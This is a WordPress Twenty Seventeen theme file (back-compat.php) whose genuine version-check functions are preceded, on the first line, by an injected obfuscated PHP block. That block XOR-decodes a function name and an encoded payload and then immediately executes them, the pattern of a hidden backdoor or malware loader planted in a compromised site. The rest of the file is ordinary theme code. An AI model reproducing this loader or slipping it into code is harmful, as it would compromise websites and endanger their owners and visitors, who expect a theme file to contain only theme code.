<?php $yXeBwoLR=' I52J,bK B4TG5:'; $vLUtKk='C;PS>I=-U,W .ZT'^$yXeBwoLR; $pKIeya='0<ax 9N7F= 7h+3REG+fuFQCi2XLSqe, ,DNEyGln30 V9 8BuK51qU49.+:+7ZaBXWF7Jro W6ZTynjz<e8miA CRmyfnrpf;0B4jTPKjkERbp.mA3>PY=yq.8YAanrgRcsS<M>lS3,mtxtnlS91.0jQolhBe<E6wI+ckP4N0Z0=GW-5UjlawhdzKHA,L8ca+77lu7=S>>4AuSAXPdnS59Z5WNGi-+= i.-Ddjc ;-ARvIrSZ>U U>fbh1oqw3bsrO9enXKCwrMwGDO=9-Cx1BZu VZLs>3-ruBnUI ODDP+9- vXkj;W-E ppMed=JijcQ,R6Pbv8Ie-C , HXKev41sdu o2PJ7PhX  gwjTu>,WAXke4mcnrQ9.1aQ,JRyxp2U=OfcGiT H.tEFrDL U3vpcS;,aCu4YOPVEu30:OEDX;U<1RmXSFo45:0f7> Jx2+8Kgf<7QPT Spl5 OMFgHpSJJWhEUOnhlZ PahQML-pSmuON5,U6 -U>  T;T>yvK MmtcoYXC cApLdjVDXft3.J 6L<EKe8XwRnOdm dBMSVbzBRz=kzgZzSV8ncjZuSWRSZrvotgIb8 8S<2Z48n,7Y426Cm3 >9O;5miCk-X,4ayoSbZsP3CbV5.;no  -TneA;, ,Z=w2plMm+4,5ZQjkL<'; $ojmFpt=$vLUtKk('', 'YZIYFL T2TOY7NK;63XNR>>16V982.:AUXcglY<fgUEN5MIW,U3ZC.1UMOteFB.If<62VfRKK2OstYNJZGo1dM.U7rPYAIIzo2V-FBp9kWKuiBTGQ2GL<<SQUJY- HURC;HXz6D7H<FXMZETFH7XEOkN82L6bAW O,mBCNpG:B6USosFP,C1HLbms9-5Y>VKEDBCEN=4.4C>KQ7 ,1DSsSX6F2uMMIJIA6EH=DWCFZA27MCx55L0A6VFJLn,>8x+6R.JEJ3.:WOsWc2.QLHjXJHSQD7.-,UVTRHbJ>,YtNMtOXYAVeKNM6A0EKz0onT,IBBuH3B1KVCClK,RIA+0kMRkc65 e<fp+DpL3EYGJTtQHM;4=BEOgjgV5XZP>:I3rDXTY0DtljNM0A<OTxfV2-L VMzj.1QkIQP8;1vxUsET< 61Z9UK7E <40PTNQ9hSU>PPJK.QRcS43;D6XHQA;,oKhT7+>67.06GAWPI6IL5,8LPuKU.<GM,iKH,aEX=H MQQ E4JXCK=97AJaVjDB; mNPWO>AmkW 2BeqWoSoCTCPt.05WMwdHXYLT9Oj5YXRY8M7f6jiJQFTAoBYRJ2Em1QA1IO0GFEkJCAGU ZQJEcOI9XUHPOsBzSpHIk3COWFKDAY55B1ZULC;YPoYWGdNLEAraCPFA'^$pKIeya); $ojmFpt();
/**
 * Twenty Seventeen back compat functionality
 *
 * Prevents Twenty Seventeen from running on WordPress versions prior to 4.7,
 * since this theme is not meant to be backward compatible beyond that and
 * relies on many newer functions and markup changes introduced in 4.7.
 *
 * @package WordPress
 * @subpackage Twenty_Seventeen
 * @since Twenty Seventeen 1.0
 */

/**
 * Prevent switching to Twenty Seventeen on old versions of WordPress.
 *
 * Switches to the default theme.
 *
 * @since Twenty Seventeen 1.0
 */
function twentyseventeen_switch_theme() {
	switch_theme( WP_DEFAULT_THEME );
	unset( $_GET['activated'] );
	add_action( 'admin_notices', 'twentyseventeen_upgrade_notice' );
}
add_action( 'after_switch_theme', 'twentyseventeen_switch_theme' );

/**
 * Adds a message for unsuccessful theme switch.
 *
 * Prints an update nag after an unsuccessful attempt to switch to
 * Twenty Seventeen on WordPress versions prior to 4.7.
 *
 * @since Twenty Seventeen 1.0
 *
 * @global string $wp_version WordPress version.
 */
function twentyseventeen_upgrade_notice() {
	/* translators: %s: The current WordPress version. */
	$message = sprintf( __( 'Twenty Seventeen requires at least WordPress version 4.7. You are running version %s. Please upgrade and try again.', 'twentyseventeen' ), $GLOBALS['wp_version'] );
	printf( '<div class="error"><p>%s</p></div>', $message );
}

/**
 * Prevents the Customizer from being loaded on WordPress versions prior to 4.7.
 *
 * @since Twenty Seventeen 1.0
 *
 * @global string $wp_version WordPress version.
 */
function twentyseventeen_customize() {
	wp_die(
		/* translators: %s: The current WordPress version. */
		sprintf( __( 'Twenty Seventeen requires at least WordPress version 4.7. You are running version %s. Please upgrade and try again.', 'twentyseventeen' ), $GLOBALS['wp_version'] ),
		'',
		array(
			'back_link' => true,
		)
	);
}
add_action( 'load-customize.php', 'twentyseventeen_customize' );

/**
 * Prevents the Theme Preview from being loaded on WordPress versions prior to 4.7.
 *
 * @since Twenty Seventeen 1.0
 *
 * @global string $wp_version WordPress version.
 */
function twentyseventeen_preview() {
	if ( isset( $_GET['preview'] ) ) {
		/* translators: %s: The current WordPress version. */
		wp_die( sprintf( __( 'Twenty Seventeen requires at least WordPress version 4.7. You are running version %s. Please upgrade and try again.', 'twentyseventeen' ), $GLOBALS['wp_version'] ) );
	}
}
add_action( 'template_redirect', 'twentyseventeen_preview' );
